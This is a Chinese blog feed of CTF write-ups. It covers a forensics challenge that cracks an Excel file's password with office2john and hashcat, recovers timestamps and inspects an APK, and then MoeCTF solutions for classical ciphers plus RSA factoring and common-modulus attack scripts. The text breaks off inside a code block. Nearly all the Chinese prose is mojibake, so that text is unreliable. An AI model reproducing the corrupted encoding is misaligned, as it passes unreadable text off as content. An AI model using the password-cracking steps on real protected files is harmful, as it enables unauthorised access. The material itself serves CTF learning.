<p>office2johnã€<a href="https://raw.githubusercontent.com/truongkma/ctf-tools/master/John/run/office2john.py%E3%80%91%E6%8F%90%E5%8F%96hash+hashcat%E7%88%86%E7%A0%B4">https://raw.githubusercontent.com/truongkma/ctf-tools/master/John/run/office2john.pyã€‘æå–hash+hashcatçˆ†ç ´</a></p>
<p>ä½¿ç”¨office2johnå°†officeè½¬æ¢ä¸ºhash</p>
<p>python2 office2john.py è®°è´¦2022.6.xlsx &gt; 6.txt</p>
<p>awk -F â€œ:â€ â€˜{print $2}â€™ 6.txt &gt; hash6.txt åˆ†å‰²è½¬æ¢æˆhashå½¢å¼</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063771341-4e0e033b-f2c5-4eea-ad94-e63cbbd3afd6.png" alt="img"></p>
<p>ä½¿ç”¨hashcatè¿›è¡Œç ´è§£</p>
<p>hashcat -a 3 -m 9400 â€“force â€˜$office$<em>2007</em>20<em>128</em>16<em>f02ba736547ad5a1c36bed8d8a56b752</em>8753f6105ce9822aa806adff2c36e6e4*209409be3a4215f4fd42ab6d5ff28496e2973783â€™ â€˜qw?h?h?h?h?h?h?h?hâ€™ -o 6result.txt </p>
<p>ç›´æ¥è·‘é»˜è®¤çš„æ„é€ å­—å…¸æ—¶é—´æ¯”è¾ƒä¹… æœ€å¥½æ˜¯é€šè¿‡æ„é€ çš„å¯†ç æœ¬å»çˆ†ç ´</p>
<p>å¾—åˆ°å¯†ç ä¸º flag{qwer123456} </p>
<p><strong>é¢˜ç›®4-3</strong>ï¼ˆæœ¬é¢˜7åˆ†ï¼‰</p>
<p>æ¢å¤è¯¥æ–‡ä»¶ï¼Œä»¥è¯¥æ–‡ä»¶çš„åˆ›å»ºæ—¶é—´ä½œä¸ºflagæäº¤ã€‚</p>
<p>ï¼ˆæ ¼å¼ï¼š2023-12-1902:11:11ï¼Œå»é™¤ç©ºæ ¼ï¼‰</p>
<p>2022-07-1409:15:07 è¿™ä¸ªæ˜¯é”™çš„ æ¨æµ‹æ˜¯æ—¶åŒºå’Œå–è¯ç£ç›˜æ—¶åŒºä¸å¯¹</p>
<p>ä½†æ˜¯ç­”æ¡ˆæœ‰é—®é¢˜ ï¼ˆä»”ç»†çœ‹ åˆ›å»ºæ—¶é—´åœ¨ä¿®æ”¹æ—¶é—´ä¹‹å æ„Ÿè§‰è¢«ç¯¡æ”¹äº† éœ€è¦è¿›è¡Œè¿˜åŸ ä½†æ˜¯é—®äº†ä¸‹åˆ«äººè¯´è¿™æ²¡å•¥é—®é¢˜ï¼‰</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063808314-c0196a33-6da5-49b6-864d-3918d351fcc1.png" alt="img"></p>
<p>æ—¶åŒºæœ‰é—®é¢˜ éœ€è¦ -8 æ‰èƒ½åˆ°é•œåƒæ–‡ä»¶çš„æ—¶åŒº</p>
<p>flag{2022-07-1401:15:07}</p>
<p><strong>é¢˜ç›®5-1</strong>(æ£€æ2.rar-2)ï¼ˆæœ¬é¢˜5åˆ†ï¼‰</p>
<p>åˆ†ææ£€æç½‘ç«™çš„ç®¡ç†åå°ï¼Œå¹¶ä»¥æ­¤URLä½œä¸ºflagæäº¤ã€‚ï¼ˆæ ¼å¼ï¼š<a href="http://ip:port/xxx,å…¨å°å†™ï¼‰">http://ip:port/xxx,å…¨å°å†™ï¼‰</a></p>
<p><a href="http://192.168.181.187:8000/admin/">http://192.168.181.187:8000/admin/</a></p>
<p>åœ¨é¢˜ç›®2ä¸­ /home/admin888 ç›®å½•ä¸‹å­˜åœ¨script.shæ–‡ä»¶ä¸­æ³„éœ²äº†Djangoå¼€å‘ç«¯å£ æ‰€ä»¥å¯ä»¥ç›´æ¥å»è®¿é—®8000ç«¯å£ æˆ–è€…æ‰«ä¸‹ç«¯å£ä¹Ÿæ‰¾å¾—åˆ°8000ç«¯å£</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063833700-95291d41-ddc5-4bc1-8814-7501abc4712c.png" alt="img"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063866700-bc9d927c-9c6b-443f-8ed4-3c4136e6b5d5.png" alt="img"></p>
<p><strong>é¢˜ç›®5-2</strong>ï¼ˆæœ¬é¢˜2åˆ†ï¼‰</p>
<p>åˆ†æç½‘ç«™åå°çš„è¶…çº§ç®¡ç†å‘˜è´¦å·ï¼Œä»¥æ­¤ä½œä¸ºflagæäº¤ã€‚</p>
<p>admin888</p>
<p><strong>é¢˜ç›®5-3</strong>ï¼ˆæœ¬é¢˜5åˆ†ï¼‰</p>
<p>åˆ†æç½‘ç«™å¯†ç çš„åŠ å¯†æ–¹å¼ï¼Œå¹¶ä»¥æ­¤ç®—æ³•åç§°ä½œä¸ºflagæäº¤ã€‚</p>
<p>è¿›å…¥user </p>
<p>ã€pbkdf2_sha256ã€‘è¿™ä¸ªç­”æ¡ˆæœ‰é—®é¢˜</p>
<p><strong>é¢˜ç›®5-4</strong>ï¼ˆæœ¬é¢˜3åˆ†ï¼‰</p>
<p>åˆ†æè¯¥ç½‘ç«™è®°å½•çš„é“¶è¡Œå¡ä¿¡æ¯æ•°é‡ï¼Œå¹¶ä»¥æ­¤ä½œä¸ºflagæäº¤ã€‚</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063882575-77a89ac8-35da-4680-8534-b7a4a9308d0c.png" alt="img"></p>
<p>45</p>
<p><strong>é¢˜ç›®5-5</strong>ï¼ˆæœ¬é¢˜5åˆ†ï¼‰</p>
<p>åˆ†æå®¶åº­ä½å€åœ¨è‹å·çš„ç”¨æˆ·ï¼Œå¹¶å…¶æ‰‹æœºå·ä½œä¸ºflagæäº¤ã€‚</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063894250-6f2c03df-70d2-4bae-a662-78b2d1a05f66.png" alt="img"></p>
<p>15066223399</p>
<p><strong>é¢˜ç›®6-1</strong>(æ£€æ5)ï¼ˆæœ¬é¢˜3åˆ†ï¼‰</p>
<p>åˆ†æè¯¥apkè·å¾—çš„æƒé™ï¼Œå¹¶ä»¥æ­¤ä½œä¸ºflagæäº¤ã€‚ï¼ˆç¤ºä¾‹ï¼šå­˜å‚¨ç©ºé—´ï¼‰</p>
<p>flag{ä½ç½®ä¿¡æ¯ã€å­˜å‚¨ç©ºé—´ã€ç”µè¯ã€é€šè®¯å½•}</p>
<p>æ¨¡æ‹Ÿå™¨å®‰è£…apk æŸ¥çœ‹åº”ç”¨æƒé™</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063916172-d78cc47e-cca7-4384-86de-1a18ad83b3c0.png" alt="img"></p>
<p><strong>é¢˜ç›®6-2</strong>ï¼ˆæœ¬é¢˜7åˆ†ï¼‰</p>
<p>åˆ†æè¯¥apkçš„é¦–é¡µå›ä¼ åœ°å€ï¼Œå¹¶ä»¥æ­¤ä½œä¸ºflagæäº¤ã€‚ï¼ˆç¤ºä¾‹ï¼š<a href="http://www.test.com:12345ï¼‰">www.test.com:12345ï¼‰</a></p>
<p><a href="http://www.xz-2021.com:8081/">www.xz-2021.com:8081</a></p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063925071-3b171778-c496-45b9-8707-fd6678470c2c.png" alt="img"></p>
<p><strong>é¢˜ç›®6-3</strong>ï¼ˆæœ¬é¢˜3åˆ†ï¼‰</p>
<p>åˆ†æè¯¥apkçš„ç­¾åç±»å‹ï¼Œå¹¶ä»¥æ­¤ä½œä¸ºflagæäº¤ã€‚ï¼ˆå…¨å°å†™ï¼‰</p>
<p>Signature type: SHA256withRSA</p>
<p>flag{SHA256withRSA}</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063934804-731277c5-5c96-48ed-9715-f087dc58c4ff.png" alt="img"></p>
<p><strong>é¢˜ç›®6-4</strong>ï¼ˆæœ¬é¢˜7åˆ†ï¼‰</p>
<p>åˆ†æapkçš„å…¥å£å‡½æ•°ï¼Œå¹¶ä»¥æ­¤ä½œä¸ºflagæäº¤ã€‚ï¼ˆç¤ºä¾‹ï¼šcom.aa.bb.cc.ddï¼‰</p>
<p>android.intent.category.LAUNCHER</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063943231-8cac913b-b6fa-4c9c-8431-3c65bc03e73a.png" alt="img"></p>
]]></content>
      <categories>
        <category>å–è¯</category>
      </categories>
      <tags>
        <tag>å–è¯</tag>
      </tags>
  </entry>
  <entry>
    <title>MoeCTF_WriteUp</title>
    <url>/posts/undefined/</url>
    <content><![CDATA[<p>å‰æ®µæ—¶é—´åˆ·äº†ä¸‹è¥¿ç”µmoectfï¼Œä½œä¸ºè€ç­¾åˆ°å‹æ··å­é€‰æ‰‹æ¥å­¦ä¹ ä¸‹</p>
<p>ä¸»è¦åšäº†ä¸‹ miscå’Œcrypto   ä¹‹å‰æ²¡æè¿‡ç°ä»£å¯†ç å­¦ç›¸å…³çš„ï¼Œç„¶åä¸»è¦å­¦äº†ä¸‹rsaç›¸å…³ç®—æ³• åŸç†ï¼Œåªèƒ½è¯´å¤ªéœ€è¦ä¾é æ•°å­¦åŸºç¡€äº†ï¼Œå¥½å¤šå…¬å¼æ ¹æœ¬æ¨åˆ°ä¸å‡ºæ¥ å¤ªèœäº†QAQï¼Œä¸€ä¸ªå…¬å¼æ¨åŠå¤©ï¼ˆæ‘¸é±¼å¥½æ–¹æ³•ï¼‰</p>
<h3 id="Classical-Crypto"><a href="#Classical-Crypto" class="headerlink" title="Classical-Crypto"></a>Classical-Crypto</h3><h4 id="ezrot"><a href="#ezrot" class="headerlink" title="ezrot"></a>ezrot</h4><p>&gt;@64E7LC@Ecf0:D0;FDE020D:&gt;!=60=6EE6C0DF3DE:EFE:@?04:!96C0tsAJdEA6d;F}%0N</p>
<p>è€ƒå¯Ÿçš„rotå¯†ç  å¸¸è§rotåŠ å¯†åŒ…æ‹¬ rot5 rot13 rot18 rot47</p>
<p>Rot47 å¯¹æ•°å­— å­—æ¯ ç¬¦å·ä¼šè¿›è¡Œç¼–ç  </p>
<p><img src="/posts/undefined/1.png" alt="img"></p>
<p>moectf{rot47_is_just_a_simPle_letter_substitution_ciPher_EDpy5tpe5juNT_}</p>
<h4 id="å¯å¯çš„æ–°å›´å¢™"><a href="#å¯å¯çš„æ–°å›´å¢™" class="headerlink" title="å¯å¯çš„æ–°å›´å¢™"></a>å¯å¯çš„æ–°å›´å¢™</h4><p>mt3_hsTal3yGnM_p3jocfFn3cp3_hFs3c_3TrB__i3_uBro_lcsOp}e{ciri_hT_avn3Fa_j<br>æ …æ å¯†ç  æ æ•°ä¸º3</p>
<p>moectf{F3nc3_ciph3r_shiFTs_3ach_l3TT3r_By_a_Giv3n_nuMB3r_oF_plac3s_Ojpj}</p>
<h4 id="çš‡å¸çš„æ–°å¯†ç "><a href="#çš‡å¸çš„æ–°å¯†ç " class="headerlink" title="çš‡å¸çš„æ–°å¯†ç "></a>çš‡å¸çš„æ–°å¯†ç </h4><p>å¬é¢˜ç›®åº”è¯¥æ˜¯å‡¯æ’’å¯†ç æˆ–è€…å˜ç§</p>
<p>tvljam{JhLzhL_JPwoLy_Pz_h_cLyF_zPtwPL_JPwoLy!_ZmUVUA40q5KbEQZAK5Ehag4Av}</p>
<p><a href="http://www.hiencode.com/caesar.html">http://www.hiencode.com/caesar.html</a>  åœ¨çº¿è§£å¯†  t -&gt; m åº”è¯¥æ˜¯7ä¸ª<br>moectf{caesae_cipher_is_a_very_simpie_cipher!_sfnont40j5duxjstd5xatz4to}</p>
<p>ä½†æ˜¯flagå¥½åƒä¸å¯¹ï¼Ÿï¼ï¼ è¿™ä¸ªè§£å¯†çš„å¤§å°å†™å…¨å˜ä¸ºå°å†™äº† æ¢å¦ä¸€ä¸ªè§£å¯†çš„  å¾—åˆ°flag </p>
<p>moectf{CaEsaE_CIphEr_Is_a_vErY_sImpIE_CIphEr!_SfNONT40j5DuXJSTD5Xatz4To}</p>
<h4 id="ä¸æ˜¯â€œçš‡å¸çš„æ–°å¯†ç â€"><a href="#ä¸æ˜¯â€œçš‡å¸çš„æ–°å¯†ç â€" class="headerlink" title="ä¸æ˜¯â€œçš‡å¸çš„æ–°å¯†ç â€"></a>ä¸æ˜¯â€œçš‡å¸çš„æ–°å¯†ç â€</h4><p>ä¸æ˜¯å‡¯æ’’å¯†ç  æ„Ÿè§‰æ˜¯æŸç§æ›¿æ¢å˜ç§</p>
<p>scsfct{wOuSQNfF_IWdkNf_Jy_o_zLchmK_voumSs_zvoQ_loFyof_FRdiKf_4i4x4NLgDn}</p>
<p>md5 of flag (utf-8) <code>ea23f80270bdd96b5fcd213cae68eea5</code></p>
<p>scsfct{wOuSQNfF_IWdkNf_Jy_o_zLchmK_voumSs_zvoQ_loFyof_FRdiKf_4i4x4NLgDn}</p>
<p>moectf{mAnCTF<br>ascii<br>s -&gt; m  115  109  -6   20<br>c -&gt; o  99  111  +12  12<br>s -&gt; e  115  101  -14  12<br>f -&gt; c  102  99  -3   23<br>c -&gt; t  99  116  +17  17<br>t -&gt; f  116  102  -12  14</p>
<p>çœ‹ä¸å‡ºå•¥è§„å¾‹æ¥</p>
<p>è¯•äº†ä¸‹ ç»´å‰å°¼äºšå¯†ç  çˆ†ç ´ <a href="https://www.dcode.fr/vigenere-cipher">https://www.dcode.fr/vigenere-cipher</a>  å°†éƒ¨åˆ†æ˜æ–‡è®¾ç½®ä¸ºmoectf</p>
<p><img src="/posts/undefined/2.png" alt="img"></p>
<p>ç»™äº†ä¸ªkey ä½ GOODJO å»æäº¤flag æ˜¯é”™çš„ è¯•äº†ä¸‹GOODJOB </p>
<p><img src="/posts/undefined/3.png" alt="img"></p>
<p>å¾—åˆ°flag moectf{vIgENErE_CIphEr_Is_a_lIttlE_hardEr_thaN_caEsar_CIphEr_4u4u4EXfXz}</p>
<h4 id="å–µè¨€å–µè¯­"><a href="#å–µè¨€å–µè¯­" class="headerlink" title="å–µè¨€å–µè¯­"></a>å–µè¨€å–µè¯­</h4><p>DESCRIPTION: ç‹—æ›°ï¼šâ€å–µå–µå–µå–µå–µï¼Ÿï¼Ÿâ€œ<br>è¯·è§£å‡ºåè¯·è½¬æ¢ä¸ºå…¨å¤§å†™ï¼Œå•è¯é—´ä»¥ä¸‹åˆ’çº¿åˆ†éš”ï¼Œå¥—ä¸Šmoectf{}åæäº¤<br>hint: Morse Code<br>å–µå–µï¼Ÿ å–µå–µå–µå–µå–µå–µå–µå–µå–µå–µå–µå–µ å–µå–µå–µ å–µå–µå–µå–µå–µå–µå–µå–µï¼Ÿå–µå–µï¼Ÿå–µå–µå–µå–µå–µï¼Ÿ å–µå–µï¼Ÿå–µå–µå–µå–µå–µï¼Ÿ å–µå–µå–µå–µå–µï¼Ÿ å–µå–µå–µå–µå–µï¼Ÿå–µå–µï¼Ÿ å–µå–µå–µå–µå–µï¼Ÿ å–µå–µå–µå–µå–µå–µ å–µå–µå–µå–µå–µå–µ å–µå–µå–µå–µå–µå–µå–µå–µï¼Ÿå–µå–µï¼Ÿå–µå–µå–µå–µå–µï¼Ÿ å–µå–µï¼Ÿå–µå–µå–µå–µå–µï¼Ÿå–µå–µå–µ å–µå–µå–µå–µå–µï¼Ÿ å–µå–µï¼Ÿ å–µå–µå–µå–µå–µå–µå–µå–µï¼Ÿå–µå–µï¼Ÿå–µå–µå–µå–µå–µï¼Ÿ å–µå–µï¼Ÿå–µå–µå–µå–µå–µå–µå–µå–µå–µ å–µå–µå–µå–µå–µå–µå–µå–µï¼Ÿ å–µå–µï¼Ÿ å–µå–µå–µå–µå–µå–µå–µå–µï¼Ÿå–µå–µï¼Ÿå–µå–µå–µå–µå–µï¼Ÿ å–µå–µï¼Ÿå–µå–µå–µå–µå–µå–µå–µå–µå–µ å–µå–µå–µ å–µå–µå–µå–µå–µå–µå–µå–µï¼Ÿå–µå–µï¼Ÿå–µå–µå–µå–µå–µï¼Ÿ å–µå–µï¼Ÿå–µå–µå–µå–µå–µï¼Ÿå–µå–µå–µ å–µå–µå–µå–µå–µï¼Ÿ å–µå–µå–µå–µå–µï¼Ÿå–µå–µå–µå–µå–µå–µ å–µå–µå–µå–µå–µï¼Ÿå–µå–µå–µå–µå–µå–µ å–µå–µå–µ å–µå–µï¼Ÿå–µå–µå–µå–µå–µå–µ å–µå–µå–µå–µå–µå–µå–µå–µï¼Ÿå–µå–µï¼Ÿå–µå–µå–µå–µå–µï¼Ÿ å–µå–µï¼Ÿå–µå–µï¼Ÿå–µå–µå–µ å–µå–µï¼Ÿå–µå–µï¼Ÿå–µå–µï¼Ÿ å–µå–µå–µå–µå–µå–µå–µå–µï¼Ÿ å–µå–µï¼Ÿå–µå–µï¼Ÿå–µå–µå–µå–µå–µå–µ å–µå–µå–µå–µå–µå–µ å–µå–µå–µå–µå–µå–µå–µå–µï¼Ÿå–µå–µï¼Ÿå–µå–µå–µå–µå–µï¼Ÿ å–µå–µï¼Ÿå–µå–µå–µå–µå–µå–µå–µå–µå–µ å–µå–µï¼Ÿå–µå–µå–µå–µå–µï¼Ÿå–µå–µï¼Ÿ å–µå–µå–µå–µå–µå–µå–µå–µï¼Ÿå–µå–µï¼Ÿå–µå–µå–µå–µå–µï¼Ÿ å–µå–µå–µå–µå–µï¼Ÿå–µå–µå–µ å–µå–µï¼Ÿå–µå–µå–µå–µå–µå–µå–µå–µï¼Ÿ<br>çœ‹äº†ä¸‹è§„å¾‹ åº”è¯¥æ˜¯ 3ä¸ªä¸€ç»„  å–µå–µå–µ å’Œ å–µå–µï¼Ÿ</p>
<p>åˆ†åˆ«æ›¿æ¢ä¸º -å’Œ .<br>å…ˆå°†å–µå–µï¼Ÿ æ›¿æ¢ä¸º-  å–µå–µå–µæ¢ä¸º.  å¾—åˆ°flag</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.... . ..--.- -.- .- .-- .- .. .. ..--.- -.-. .- - ..--.- -... ..- - ..--.- -... . ..--.- -.-. .- .-.. .-.. . -.. ..--.- --. --- ..- --.. .. ..--.- -... -.-- ..--.- .-. -..-</span><br></pre></td></tr></table></figure>



<p>æ ¹æ®è¦æ±‚æ›¿æ¢ä¸ºå¤§å†™<br>THE_KAWAII_CAT_BUT_BE_CALLED_GOUZI_BY_RX<br>moectf{THE_KAWAII_CAT_BUT_BE_CALLED_GOUZI_BY_RX}</p>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="factor-signin-ã€-nç´ æ•°åˆ†è§£ã€‘"><a href="#factor-signin-ã€-nç´ æ•°åˆ†è§£ã€‘" class="headerlink" title="factor_signin ã€ nç´ æ•°åˆ†è§£ã€‘"></a>factor_signin ã€ nç´ æ•°åˆ†è§£ã€‘</h4><p>å·²çŸ¥ n1 n2 c1 c2 e </p>
<p>n1 å¯åˆ†è§£ä¸º p q </p>
<p>n2 å¯åˆ†è§£æˆ32ä¸ªè´¨æ•° â€¦ æœ¬æƒ³æ ¹æ®n1 åˆ†è§£p q ç®—å‡ºmé«˜ä½ ç”¨ Stereotyped messagesæ”»å‡» ä½†æ˜¯è€ƒè™‘åˆ°e å¤ªå¤§äº† ä¸€ç›´æ²¡è·‘å‡ºæ¥ å°±è¾¹è·‘è¾¹å°†n2åˆ†è§£åçš„ç´ æ•°è¿›è¡Œè¿ç®—</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c1 =  <span class="number">10004937130983861141937782436252502991050957330184611684406783226971057978666503675149401388381995491152372622456604317681236160071166819028679754762162125904637599991943368450200313304999566592294442696755822585022667008378021280392976010576970877334159755332946926433635584313137140987588847077645814987268595739733550220882135750267567373532603503399428451548677091911410732474324157868011686641243202218731844256789044721309478991918322850448456919991540932206923861653518190974620161055008847475600980152660468279765607319838003177639654115075183493029803981527882155542925959658123816315099271123470754815045214896642428657264709805029840253303446203030294879166242867850331945166255924821406218090304893024711068773287842075208409312312188560675094244318565148284432361706108491327014254387317744284876018328591380705408407853404828189643214087638328376675071962141118973835178054884474523241911240926274907256651801384433652425740230755811160476356172444327762497910600719286629420662696949923799255603628210458906831175806791599965316549386396788014703044837917283461862338269599464440202019922379625071512100821922879623930069349084917919100015782270736808388388006084027673781004085620817521378823838335749279055639005125</span></span><br><span class="line">n1 =  <span class="number">343504538870081878757729748260620800783581983635281373321527119223374418103340873199654926888439040391545101913132680017655039577253974802351999985470115474655124168592386965001556620077117966153475518658881140827499124290142523464795351995478153288872749817655925271395693435582010998996210909883510311066017237567799370371513462802547313382594409676803895262837061350017911885033133654781876923251129406855067993830824618637981136966134029212516871210627954762147349788788999116702635535406398258621926040887099782494271000823401788337120154104692934583729065189687995570122890809807661370008740283447636580308161498808092269041815719148127168137018600113465985504975054319601741498799761500526467431533990903047624407330243357514588557352746347337683868781554819821575385685459666842162355673947984514687068626166144076257334426612302554448774082488600083569900006274897032242821388126274957846236552373226099112200392102883351088570736254707966329366625911183721875374731791052229266503696334310835323523568132399330263642353927504971311717117370721838701629885670598853025212521537158141447625623337563164790788106598854822686494249848796441153496412236527242235888308435573209980270776407776277489669763803746640746378181948641</span></span><br><span class="line">c2 =  <span class="number">4948422459907576438725352912593232312182623872749480015295307088166392790756090961680588458629287353136729331282506869598853654959933189916541367579979613191505226006688017103736659670745715837820780269669982614187726024837483992949073998289744910800139692315475427811724840888983757813069849711652177078415791290894737059610056340691753379065563574279210755232749774749757141836708161854072798697882671844015773796030086898649043727563289757423417931359190238689436180953442515869613672008678717039516723747808793079592658069533269662834322438864456440701995249381880745586708718334052938634931936240736457181295</span></span><br><span class="line">n2 =  <span class="number">8582505375542551134698364096640878629785534004976071646505285128223700755811329156276289439920192196962008222418309136528180402357612976316670896973298407081310073283979903409463559102445223030866575563539261326076167685019121804961393115251287057504682389257841337573435085535013992761172452417731887700665115563173984357419855481847035192853387338980937451843809282267888616833734087813693242841580644645315837196205981207827105545437201799441352173638172133698491126291396194764373021523547130703629001683366722885529834956411976212381935354905525700646776572036418453784898084635925476199878640087165680193737</span></span><br><span class="line"></span><br><span class="line">p1 = <span class="number">18055722101348711626577381571859114850735298658417345663254295930584841136416234624852520581982069555948490061840244710773146585295336094872892685938420880462305333393436098181186277450475949236132458958671804132443554885896037342335902958516394876382378829317303693655605215373555988755516058130500801822723195474873517960624159417903134580987202400855946137101429970119186394052011747475879598126195607938106163892658285305921071673588966184054026228745012993740035399652049777986535759039077634555909031397541116025395236871778797949216479130412500655359057128438928721459688727543057760739527720641179290282309741</span></span><br><span class="line">q1 = <span class="number">19024691283015651666032297670418553586155390575928421823630922553034857624430114628839720683172187406577114034710093054198921843669645736474448836706112221787749688565566635453151716934583685087745112614898780150391513798368931496744574075511968933800467288441832780919514199410584786925010518564670786685241724643282580795568609339268652910564215887176803735675069372979560024792322029911970574914829712553975379661212645059271137916107885326625543090473004683836665262304916304580076748336858662108554591235698235221618061328251985929904075811056422186525179189846420226944944513865790999242309352900287977666792901</span></span><br><span class="line"></span><br><span class="line">phi_n1=(p1-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi_n1)</span><br><span class="line">m1=<span class="built_in">pow</span>(c1,d,n1)</span><br><span class="line"><span class="built_in">print</span>(m1)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m1)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 212596243778918483494272111870643078241790667558485094730612682373848421645583137073007</span></span><br><span class="line"><span class="comment"># b&#x27;moectf&#123;fACtord6_And_YAfu_Are_6oth_go&#x27;</span></span><br></pre></td></tr></table></figure>



<h4 id="n-amp-n-ã€å…±æ¨¡æ”»å‡»ã€‘"><a href="#n-amp-n-ã€å…±æ¨¡æ”»å‡»ã€‘" class="headerlink" title="n&amp;n ã€å…±æ¨¡æ”»å‡»ã€‘"></a>n&amp;n ã€å…±æ¨¡æ”»å‡»ã€‘</h4><p>é¢˜ç›®</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read().strip().encode()</span><br><span class="line"> </span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">n = p * q</span><br><span class="line">e1 = <span class="number">0x114514</span></span><br><span class="line">e2 = <span class="number">19198101</span></span><br><span class="line"> </span><br><span class="line">c1 = <span class="built_in">pow</span>(m,e1,n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m,e2,n)</span><br><span class="line"><span class="built_in">print</span>(c1)</span><br><span class="line"><span class="built_in">print</span>(c2)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 5776799746376051463605370130675046329799612910435315968508603116759552095183027263116443417343895252766060748671845650457077393391989018107887540639775168897954484319381180406512474784571389477212123123540984850033695748142755414954158933345476509573211496722528388574841686164433315356667366007165419697987147258498693175698918104120849579763098045116744389310549687579302444264316133642674648294049526615350011916160649448726069001139749604430982881450187865197137222762758538645387391379108182515717949428258503254717940765994927802512049427407583200118969062778415073135339774546277230281966880715506688898978925</span></span><br><span class="line"><span class="comment"># 4664955020023583143415931782261983177552050757537222070347847639906354901601382630034645762990079537901659753823666851165175187728532569040809797389706253282757017586285211791297567893874606446000074515260509831946210526182765808878824360460569061258723122198792244018463880052389205906620425625708718545628429086424549277715280217165880900037900983008637302744555649467104208348070638137050458275362152816916837534704113775562356277110844168173111385779258263874552283927767924979691542028126412133709129601685315027689094437957165812994784648540588277901241854031439324974562449032290219652206466731675967045633360</span></span><br><span class="line"><span class="comment"># 13612969130810965900902742090064423006385890357159609755971027204203418808937093492927060428980020085273603754747223030702684866992231913349067578014240319426522039068836171388168087260774376277346092066880984406890296520951318296354893551565670293486797637522297989653182109744864444697818991039473180752980752117041574628063002176339235126861152739066489620021077091941250365101779354009854706729448088217051728432010328667839532327286559570597994183126402340332924370812383312664419874352306052467284992411543921858024469098268800500500651896608097346389396273293747664441553194179933758992070398387066135330851531</span></span><br></pre></td></tr></table></figure>

<p>å·²çŸ¥c1 c2 n e1 e2 æ±‚m </p>
<p>å…±æ¨¡æ”»å‡»</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):<span class="comment"># æ¬§å‡ é‡Œå¾—ç®—æ³•</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"> </span><br><span class="line">n =  <span class="number">13612969130810965900902742090064423006385890357159609755971027204203418808937093492927060428980020085273603754747223030702684866992231913349067578014240319426522039068836171388168087260774376277346092066880984406890296520951318296354893551565670293486797637522297989653182109744864444697818991039473180752980752117041574628063002176339235126861152739066489620021077091941250365101779354009854706729448088217051728432010328667839532327286559570597994183126402340332924370812383312664419874352306052467284992411543921858024469098268800500500651896608097346389396273293747664441553194179933758992070398387066135330851531</span></span><br><span class="line">c1 = <span class="number">5776799746376051463605370130675046329799612910435315968508603116759552095183027263116443417343895252766060748671845650457077393391989018107887540639775168897954484319381180406512474784571389477212123123540984850033695748142755414954158933345476509573211496722528388574841686164433315356667366007165419697987147258498693175698918104120849579763098045116744389310549687579302444264316133642674648294049526615350011916160649448726069001139749604430982881450187865197137222762758538645387391379108182515717949428258503254717940765994927802512049427407583200118969062778415073135339774546277230281966880715506688898978925</span></span><br><span class="line">c2 = <span class="number">4664955020023583143415931782261983177552050757537222070347847639906354901601382630034645762990079537901659753823666851165175187728532569040809797389706253282757017586285211791297567893874606446000074515260509831946210526182765808878824360460569061258723122198792244018463880052389205906620425625708718545628429086424549277715280217165880900037900983008637302744555649467104208348070638137050458275362152816916837534704113775562356277110844168173111385779258263874552283927767924979691542028126412133709129601685315027689094437957165812994784648540588277901241854031439324974562449032290219652206466731675967045633360</span></span><br><span class="line">e1 = <span class="number">0x114514</span></span><br><span class="line">e2 = <span class="number">19198101</span></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"><span class="comment"># æ±‚æ¨¡åå…ƒç´ </span></span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = invert(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = invert(c2, n)</span><br><span class="line"> </span><br><span class="line">m = <span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n) % n</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span 